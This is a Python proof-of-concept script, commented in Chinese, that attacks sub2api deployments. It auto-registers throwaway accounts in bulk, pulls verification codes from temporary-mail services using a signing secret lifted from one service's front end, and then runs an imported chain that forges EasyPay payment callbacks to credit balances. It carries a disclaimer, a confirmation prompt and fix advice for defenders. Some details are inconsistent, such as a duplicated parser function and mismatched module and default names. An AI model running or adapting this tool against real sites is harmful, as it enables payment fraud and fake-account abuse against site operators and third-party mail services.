#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 sub2api 自动注册 + 易支付(EasyPay)验签绕过复现 - 一体化脚本
 GitHub issue: https://github.com/Wei-Shaw/sub2api/issues/7881
================================================================================

 流程:
   1. 生成随机 gmail.com 邮箱 + 随机密码 (可用 --email/--password 固定)
   2. 调 POST /api/v1/auth/register 自动注册;
      目标要求邮箱验证码 (EMAIL_VERIFY_REQUIRED) -> 跳过该账号
   3. 注册成功后复用 sub2api_easypay_poc.py 的完整攻击链,
      测试伪造回调入账漏洞是否可复现

 用法:
   python sub2api_auto_register_poc.py --target https://site --yes
   python sub2api_auto_register_poc.py --target https://site --amount 100 --count 3
   python sub2api_auto_register_poc.py            # 交互式

 依赖: 同目录下的 sub2api_easypay_poc.py; 纯标准库 (装 rich 体验更佳)

 ! 法律声明: 本工具仅供安全研究/自查。仅限用于你自己部署或获得书面授权的
   目标。对未授权目标使用造成的任何后果由使用者自行承担。
================================================================================
"""

import argparse
import hashlib
import json
import os
import random
import re
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_v3_attack_chain as poc

# Windows 控制台默认 GBK, 强制 UTF-8 输出避免中文乱码
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

DEFAULT_AMOUNT = 10.00
SAVE_FILE = "poc_accounts.jsonl"

# ============================================================
#  邮件服务集成 (tempmail.cn / emailmux.com)
#  用于目标要求邮箱验证码时自动取码。
#  注意: send-verify-code 端点通常需要人机验证, 本模块只在目标
#  不要求 captcha 时自动完成; 否则需要手工介入。
# ============================================================

# 取码正则: 中英文模板都覆盖。必须要求"关键词在前"，
# 否则 "Hello 571622," 这种问候语里的数字会被误当成验证码。
_CODE_PATTERNS = (
    r"验证码[^0-9]{0,12}(\d{6})",
    r"verification code[^0-9]{0,12}(\d{6})",
    r"verify code[^0-9]{0,12}(\d{6})",
    r"one[- ]time[^0-9]{0,12}(\d{6})",
    r"\bcode\b[^0-9]{0,12}(\d{6})",
)

EMAILMUX_SECRET = "yjd683c@47"   # emailmux 前端 index.js 明文常量: MD5(SECRET+email+ts)

EMAIL_PROVIDERS = {
    "tempmail": {
        "label": "tempmail.cn",
        # 抓包原文: GET /api/mails/12%40tempmail.cn  → 本地前缀 + %40 + 域名
        "generate": lambda email: "https://tempmail.cn/api/mails/"
                                  + urllib.parse.quote(email, safe=""),
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36",
            "Referer": "https://tempmail.cn/",
        },
        "parse": lambda body, email: _parse_tempmail(body, email),
    },
    "emailmux": {
        "label": "emailmux.com",
        "generate": lambda email: f"https://emailmux.com/emails?email={urllib.parse.quote(email)}",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36",
            "Referer": "https://emailmux.com/zh/",
        },
        "sign": lambda email, ts: hashlib.md5(
            (EMAILMUX_SECRET + email + str(ts)).encode()).hexdigest(),
        "parse": lambda body, email: _parse_emailmux(body, email),
    },
}


def _http_get(url, headers=None, timeout=10):
    req = urllib.request.Request(url, headers=headers or {}, method="GET")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace"), r.status


def _http_post(url, headers=None, data=None, timeout=10):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, headers=headers or {}, data=body, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace"), r.status


def _extract_code(*chunks, strip_email=""):
    """从邮件正文提取 6 位验证码。两个实测踩到的坑:
       1. "Hello 571622," 里的用户名也是 6 位数字 -> 必须先把邮箱本地部分剔掉;
       2. 主题里也有关键词, 真码在正文更靠后 -> 取最后一次命中而非第一次。
    """
    blob = "\n".join(str(x or "") for x in chunks)
    blob = re.sub(r"<[^>]+>", " ", blob)          # 先剥 HTML 标签
    if strip_email:
        blob = blob.replace(strip_email, " ").replace(strip_email.split("@",1)[0], " ")
    found = None
    for pat in _CODE_PATTERNS:
        for m in re.finditer(pat, blob, re.I):
            found = m.group(1)
    return found


def _parse_tempmail(body, email):
    """tempmail.cn 实测返回 {"mails":[{from,subject,text,html,raw,...}]}, 不是裸数组"""
    try:
        data = json.loads(body)
    except Exception:
        return None
    mails = data.get("mails") if isinstance(data, dict) else data
    if not isinstance(mails, list):
        return None
    for m in reversed(mails):                        # 新的信在前
        if not isinstance(m, dict):
            continue
        code = _extract_code(m.get("subject"), m.get("text"), m.get("html"),
                             strip_email=email)
        if code:
            return code
    return None


def emailmux_generate(preferred=None):
    """向 emailmux 申请一个它实际控制的邮箱。

    必须走 /generate-email — 本地随机的 gmail 是真实信箱, 收不到信。
    preferred: 目标邮件白名单里允许的域名(如 ["gmail.com","qq.com"]),
               有交集时优先申请这些, 否则白名单会拒掉。
    """
    domains = ["outlook", "hotmail", "gmail", "googlemail", "icloud", "temp"]
    if preferred:
        # emailmux 的域名参数是无后缀的关键词(gmail / outlook / ...)
        want = []
        for d in preferred:
            key = (d or "").split(".")[0].lower()
            if key in ("gmail", "googlemail", "outlook", "hotmail", "icloud"):
                want.append(key)
        if want:
            # 白名单里的排前面, 其余保留做兜底
            domains = want + [x for x in domains if x not in want]
    want_suffix = set()
    if preferred:
        want_suffix = {("@" + d).lower() for d in preferred if d}
    last = None
    backoff = 3.0
    # emailmux 按权重随机给域名, 白名单严格时必须重试到命中为止
    for _ in range(10):
        try:
            body, _ = _http_post(
                "https://emailmux.com/generate-email",
                headers={"Content-Type": "application/json",
                         "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36",
                         "Referer": "https://emailmux.com/zh/"},
                data={"domains": domains},
            )
        except urllib.error.HTTPError as he:
            if he.code == 429:
                time.sleep(backoff)          # 限流退避, 指数增长
                backoff = min(backoff * 2, 20)
                continue
            continue
        except Exception:
            time.sleep(1.0)
            continue
        try:
            d = json.loads(body)
        except Exception:
            continue
        if d.get("status") != "success":
            time.sleep(1.0)
            continue
        em = (d.get("email") or "").lower()
        if not em:
            continue
        last = d.get("email")
        if not want_suffix:
            return last
        if any(em.endswith(sfx) for sfx in want_suffix):
            return last
        time.sleep(1.5)                      # 避免连续请求触发 429
    return last


def _parse_emailmux(body, email):
    """emailmux.com 返回 [{from, subject, snippet, ...}]"""
    try:
        mails = json.loads(body)
    except Exception:
        return None
    if not isinstance(mails, list):
        return None
    for m in mails:
        if not isinstance(m, dict):
            continue
        subj = m.get("subject", "") or ""
        text = " ".join(str(m.get(k, "")) for k in ("snippet", "body", "text", "content", "html"))
        for pat in _CODE_PATTERNS:
            hit = re.search(pat, subj + "\n" + text, re.I)
            if hit:
                return hit.group(1)
    return None


def _parse_emailmux(body, email):
    """emailmux.com 返回 [{email_address,sender,subject,uuid,...}]"""
    try:
        mails = json.loads(body)
    except Exception:
        return None
    if not isinstance(mails, list):
        return None
    for m in reversed(mails):
        if not isinstance(m, dict):
            continue
        code = _extract_code(m.get("subject"), m.get("snippet"), m.get("body"),
                             m.get("text"), m.get("content"), m.get("html"),
                             strip_email=email)
        if code:
            return code
    return None


def generate_mailbox(provider="auto", domain=None, preferred=None):
    """
    拿一个能收到信的临时邮箱。

    两种服务规则完全不同:
      tempmail.cn — 前缀随便拼, 直接用, 不需要申请
                    (例: 12@tempmail.cn, 也可用随机前缀)
      emailmux.com — 必须 POST /generate-email 申请, 否则拿到的地址
                     不受它控制, 永远收不到验证码
    """
    if provider == "emailmux":
        return emailmux_generate(preferred)
    if provider == "tempmail":
        # 前缀任意: 数字或随机串都行
        prefix = str(random.randint(1, 999999))
        return f"{prefix}@tempmail.cn"
    # auto: 默认 tempmail (无需申请, 最省事); 用 --email-provider emailmux 切
    if domain and domain not in ("gmail.com", "tempmail.cn"):
        # 用户显式给了域名(如目标有邮件白名单), 按原样用
        return f"{random.randint(100,999999)}@{domain}"
    return f"{random.randint(1, 999999)}@tempmail.cn"


def fetch_verify_code(email, provider="auto", timeout=60, ui=None):
    """
    从临时邮箱服务取验证码。

    provider: "auto" / "tempmail" / "emailmux"
    timeout: 最多等这么久 (秒)
    返回 6 位数字字符串, 或 None (取不到)
    """
    domain = email.split("@", 1)[-1] if "@" in email else ""
    candidates = []
    if provider == "auto":
        if "tempmail" in domain or "tm" in domain:
            candidates = ["tempmail"]
        elif "gmail" in domain or "outlook" in domain or "hotmail" in domain or "icloud" in domain:
            candidates = ["emailmux"]
        else:
            candidates = ["tempmail", "emailmux"]
    elif provider in EMAIL_PROVIDERS:
        candidates = [provider]

    start = time.time()
    while time.time() - start < timeout:
        for name in candidates:
            cfg = EMAIL_PROVIDERS[name]
            try:
                url = cfg["generate"](email)
                headers = cfg["headers"].copy()
                if name == "emailmux":
                    ts = int(time.time() * 1000)
                    headers["X-API-Timestamp"] = str(ts)
                    headers["X-API-Signature"] = cfg["sign"](email, ts)
                body, _ = _http_get(url, headers=headers, timeout=10)
                code = cfg["parse"](body, email)
                if code:
                    if ui:
                        ui.ok(f"从 {cfg['label']} 取到验证码: {code}")
                    return code
            except Exception:
                continue
        time.sleep(5)
    if ui:
        ui.warn(f"{timeout} 秒内未取到验证码")
    return None

# 注册结果分类
R_OK = "ok"
R_VERIFY = "verify_required"   # 需要邮箱验证码 -> 跳过
R_CAPTCHA = "captcha"          # 人机验证 -> 无法自动注册
R_EXISTS = "email_exists"      # 邮箱已注册 -> 换一个
R_DISABLED = "disabled"        # 未开放注册
R_INVITATION = "invitation"    # 需要邀请码
R_OTHER = "other"


def rand_email(domain="gmail.com"):
    local = "".join(random.SystemRandom().choices(
        string.ascii_lowercase + string.digits, k=12))
    return f"poc{local}@{domain}"


def rand_password(length=16):
    """随机密码: 保证含大小写/数字/符号, 满足后端 min=6 及常见复杂度要求"""
    rng = random.SystemRandom()
    groups = [string.ascii_lowercase, string.ascii_uppercase,
              string.digits, "!@#$%^&*"]
    chars = [rng.choice(g) for g in groups]
    pool = "".join(groups)
    chars += [rng.choice(pool) for _ in range(max(length - len(chars), 0))]
    rng.shuffle(chars)
    return "".join(chars)


def classify_register_error(e):
    """把注册失败的 ApiError 归类, 决定跳过/换号/中止"""
    text = f"{e.reason} {e}".lower()
    if any(k in text for k in ("captcha", "turnstile", "tencent", "aliyun", "人机")):
        return R_CAPTCHA
    if "email_verify_required" in text or "verif" in text or "验证码" in text:
        return R_VERIFY
    if "email_exists" in text or "already exists" in text:
        return R_EXISTS
    if "registration_disabled" in text or "disabled" in text:
        return R_DISABLED
    if "invitation_code_required" in text or "invitation" in text:
        return R_INVITATION
    return R_OTHER


def load_records(path):
    """读取已保存的账号记录，忽略坏行。"""
    if not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                out.append(json.loads(line))
            except Exception:
                continue
    return out


def register_account(client, args, email, password):
    """
    注册一个账号。返回 (status, data_or_err)。
    status==R_OK 时 data 为注册响应 dict (含 access_token)。
    """
    body = {"email": email, "password": password}
    if args.invitation_code:
        body["invitation_code"] = args.invitation_code
    try:
        data = client._call("POST", "/api/v1/auth/register", auth=False, json_body=body)
    except poc.ApiError as e:
        return classify_register_error(e), e
    return R_OK, data or {}


def login_account(client, email, password):
    """用已有账号登录。返回 (status, data_or_err)。"""
    try:
        data = client.login(email, password)
        return R_OK, data or {}
    except poc.ApiError as e:
        return classify_register_error(e), e


def save_record(path, rec):
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError:
        pass


def run_one(client, ui, args, email, password, amount):
    """
    注册/登录 + 完整攻击链。返回 (status, verdict_or_none)。
    status 为 R_OK 表示攻击链已执行完毕 (verdict 有值)。
    """
    ui.step(0, 5, f"{'登录' if args.use_existing else '自动注册'} {email}")
    if args.use_existing:
        status, data = login_account(client, email, password)
    else:
        status, data = register_account(client, args, email, password)

    if status == R_VERIFY:
        ui.warn("目标要求邮箱验证码, 尝试自动取码...")
        # 1) 先发验证码 (send-verify-code 端点)
        try:
            sent = client._call("POST", "/api/v1/auth/send-verify-code",
                                auth=False, json_body={"email": email})
        except poc.ApiError as e:
            ui.fail(f"发送验证码失败: {e}")
            if "captcha" in str(e).lower() or "turnstile" in str(e).lower():
                ui.info("目标要求人机验证, 无法自动发送验证码。")
                ui.info("请手工: 浏览器打开目标站点, 注册该邮箱, 拿到验证码后")
                ui.info(f"  用 --use-existing --email {email} --password {password} 继续。")
            return R_VERIFY, None

        # 2) 从临时邮箱取码
        code = fetch_verify_code(email, provider=args.email_provider,
                                 timeout=args.email_timeout, ui=ui)
        if not code:
            ui.fail("取码失败, 跳过该账号")
            return R_VERIFY, None

        # 3) 提交验证码完成注册
        try:
            data = client._call("POST", "/api/v1/auth/register",
                                auth=False, json_body={
                                    "email": email, "password": password,
                                    "verify_code": code,
                                })
        except poc.ApiError as e:
            ui.fail(f"验证码提交失败: {e}")
            return R_VERIFY, None

        token = data.get("access_token")
        if not token:
            ui.fail("验证码提交后没有 access_token")
            return R_OTHER, None
        client.token = token
        ui.ok(f"邮箱验证通过, 注册成功: {email}  密码: {password}")

        # 复用 PoC 的完整攻击链
        info = poc.get_checkout_info(client, ui)
        methods = poc.pick_methods(args, info)
        ui.info("将依次尝试支付通道: " + ", ".join(methods))
        result, evidence = poc.run_exploit(client, ui, amount, methods)
        ui.verdict(result, evidence)
        return R_OK, result
    if status == R_CAPTCHA:
        ui.fail(f"目标启用了人机验证(turnstile/captcha), 无法自动注册: {data}")
        return R_CAPTCHA, None
    if status == R_EXISTS:
        ui.warn("该邮箱已被注册, 将更换随机邮箱重试")
        return R_EXISTS, None
    if status == R_DISABLED:
        ui.fail(f"目标未开放注册: {data}")
        return R_DISABLED, None
    if status == R_INVITATION:
        ui.fail(f"目标要求邀请码: {data} (可用 --invitation-code 传入)")
        return R_INVITATION, None
    if status != R_OK:
        ui.fail(f"{'登录' if args.use_existing else '注册'}失败: {data}")
        return R_OTHER, None

    token = data.get("access_token")
    if not token:
        ui.fail("响应中没有 access_token")
        return R_OTHER, None
    client.token = token
    ui.ok(f"{'登录' if args.use_existing else '注册'}成功: {email}  密码: {password}")

    # 复用 PoC 的完整攻击链
    info = poc.get_checkout_info(client, ui)
    methods = poc.pick_methods(args, info)
    ui.info("将依次尝试支付通道: " + ", ".join(methods))
    result, evidence = poc.run_exploit(client, ui, amount, methods)
    ui.verdict(result, evidence)
    return R_OK, result


def main():
    ap = argparse.ArgumentParser(
        description="sub2api 自动注册 + 易支付验签绕过复现 (issue #7881) - 仅限授权测试")
    ap.add_argument("--target", help="目标站点, 如 https://example.com")
    ap.add_argument("--email", help="指定注册邮箱 (默认随机 gmail.com 邮箱; 仅对第 1 个账号生效)")
    ap.add_argument("--domain", default="gmail.com",
                    help="随机邮箱域名, 默认 gmail.com")
    ap.add_argument("--email-provider", default="auto",
                    choices=["auto", "tempmail", "emailmux"],
                    help="临时邮箱服务 (auto 自动按域名选择)")
    ap.add_argument("--email-timeout", type=int, default=60,
                    help="取验证码超时秒数, 默认 60")
    ap.add_argument("--password", help="指定注册密码 (默认每个账号随机生成)")
    ap.add_argument("--invitation-code", help="邀请码 (目标强制邀请码时使用)")
    ap.add_argument("--use-existing", action="store_true",
                    help="跳过注册, 用 --email/--password 直接登录 (目标要求邮箱验证码时必用)")
    ap.add_argument("--amount", type=float, default=None,
                    help=f"充值(漏洞利用)金额, 默认 {DEFAULT_AMOUNT:.0f}")
    ap.add_argument("--count", type=int, default=1,
                    help="注册并测试的账号数量, 默认 1")
    ap.add_argument("--method", help="指定 payment_type (默认自动探测)")
    ap.add_argument("--no-save", action="store_true",
                    help=f"不把账号凭据追加保存到 {SAVE_FILE}")
    ap.add_argument("--insecure", action="store_true", help="跳过 TLS 证书校验")
    ap.add_argument("--plain", action="store_true", help="禁用 rich, 使用纯文本输出")
    ap.add_argument("--yes", action="store_true", help="跳过交互确认与金额询问")
    ap.add_argument("--timeout", type=int, default=20, help="HTTP 超时秒数")
    ap.add_argument("--verbose", "-v", action="store_true", help="打印原始报文细节")
    args = ap.parse_args()

    ui = poc.UI(plain=args.plain, verbose=args.verbose)
    ui.banner()

    target = poc.normalize_base(
        args.target or ui.ask("目标站点 URL", default="http://127.0.0.1:8080"))
    if not target:
        ui.fail("目标不能为空")
        return 2
    client = poc.Sub2ApiClient(target, timeout=args.timeout, insecure=args.insecure)

    # 金额: --amount 优先; 交互模式询问 (默认 8888); --yes 直接取默认
    amount = args.amount
    if amount is None:
        if args.yes or not sys.stdin.isatty():
            amount = DEFAULT_AMOUNT
        else:
            amount = poc.ask_amount(ui, default=DEFAULT_AMOUNT)
    if amount <= 0:
        ui.fail("金额必须为正数")
        return 2

    count = max(args.count, 1)
    if args.use_existing:
        if not (args.email and args.password):
            ui.fail("--use-existing 必须同时提供 --email 和 --password")
            return 2
        count = 1
        ui.info("模式: 使用已有账号直接登录 (跳过注册)")
    ui.show_kv([
        ("目标", target),
        ("账号数量", count),
        ("充值金额", f"{amount:.2f}"),
        ("邮箱", args.email or f"随机 *@{args.domain}"),
        ("支付通道", args.method or "自动探测"),
    ], title="任务配置")

    if not args.yes and not ui.confirm(
            "确认对该目标执行 注册+完整攻击链? (必须是你的站点或已获授权)"):
        ui.warn("已取消。")
        return 0

    done, skipped_verify, fatal = 0, 0, None
    for i in range(count):
        if count > 1:
            ui._c(f"\n===== 账号 {i + 1}/{count} =====", "magenta")
        email = args.email if (args.email and i == 0) else rand_email(args.domain)
        password = args.password or rand_password()
        try:
            status, result = run_one(client, ui, args, email, password, amount)
        except poc.ApiError as e:
            ui.fail(f"流程中断: {e}")
            return 1
        except KeyboardInterrupt:
            ui.warn("\n用户中断。")
            return 130

        if status == R_OK:
            done += 1
            if not args.no_save:
                save_record(SAVE_FILE, {
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "target": target, "email": email, "password": password,
                    "amount": amount,
                    "verdict": result["verdict"], "reason": result["reason"],
                })
                ui.info(f"凭据已追加保存到 {SAVE_FILE}")
            if result["verdict"] == poc.VULNERABLE:
                ui._c("\n修复建议 (来自 issue #7881):", "yellow")
                ui._c("  1. CanonicalizeReturnURL 剥离用户 query (parsed.RawQuery = \"\")")
                ui._c("  2. VerifyNotification 增加回调参数白名单, 未知参数直接拒绝")
                ui._c("  3. (可选) 入账后异步向上游 api.php 复核订单")
                ui._c("  4. 升级前临时缓解: 易支付实例切换到非 popup (扫码/mapi) 模式")
        elif status == R_VERIFY:
            skipped_verify += 1
        elif status == R_EXISTS:
            ui.warn("该邮箱已被注册, 将更换随机邮箱重试")
            if args.use_existing:
                ui.fail("--use-existing 下该邮箱已存在但登录也失败, 请确认密码")
                return 2
            skipped_verify += 1
        elif status in (R_CAPTCHA, R_DISABLED, R_INVITATION, R_OTHER):
            fatal = status
            break  # 换号也无法解决的错误, 直接中止

    if count > 1 or skipped_verify:
        ui.show_kv([
            ("完成测试", done),
            ("验证码跳过", skipped_verify),
            ("总数", count),
        ], title="汇总")

    if done == 0 and skipped_verify > 0 and fatal is None:
        ui.warn("所有账号均因需要邮箱验证码而跳过, 未执行漏洞测试。")
        return 3
    return 0 if done > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
